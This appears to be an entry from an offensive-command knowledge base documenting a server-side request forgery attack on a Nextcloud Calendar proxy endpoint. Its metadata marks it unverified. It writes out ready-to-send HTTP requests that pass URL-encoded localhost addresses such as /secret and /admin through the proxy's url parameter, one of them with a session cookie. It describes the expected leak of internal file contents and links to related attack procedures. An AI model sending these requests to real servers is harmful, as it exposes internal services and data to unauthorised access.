---
id: 123e4567-e89b-12d3-a456-426614174005
name: nextcloud-calendar-ssrf-proxy
type: command
executor: http
data: >-
  GET
  /nextcloud/nextcloud/index.php/apps/calendar/v1/proxy?url=http%3A%2F%2Flocalhost%2Fsecret
  HTTP/1.1
output: >-
  HTTP/1.1 200 OK [...] secret (full content of the internal secret file
  displayed)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:47.931Z'
platforms:
  - Web
tags:
  - ssrf
  - nextcloud
verified: false
validated: true
submitted: true
---

# nextcloud-calendar-ssrf-proxy

## Command

```http
GET /nextcloud/nextcloud/index.php/apps/calendar/v1/proxy?url=http%3A%2F%2Flocalhost%2Fsecret HTTP/1.1
```

## Description

This HTTP request exploits the SSRF vulnerability in the Nextcloud Calendar proxy endpoint by providing an encoded internal URL, causing the server to fetch and return the content of `/secret`.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | URL-encoded target URL (e.g., http%3A%2F%2Flocalhost%2Fsecret for http://localhost/secret) | Yes |

## Examples

### Basic Usage

```http
GET /index.php/apps/calendar/v1/proxy?url=http%3A%2F%2Flocalhost%2Fsecret HTTP/1.1
Host: target-nextcloud.com
...
```

### Advanced Usage

Include authentication headers for session.

```http
GET /index.php/apps/calendar/v1/proxy?url=http%3A%2F%2F127.0.0.1%2Fadmin HTTP/1.1
Host: target-nextcloud.com
Cookie: nc_session=...
...
```

## Expected Output

HTTP/1.1 200 OK with response body containing the full content of the internal secret file, such as plain text data from localhost.

## Related

- [[commands/python-nextcloud-ssrf-ipv6-bypass]]
- [[procedures/Initiate-SSRF-via-Calendar-Subscription]]
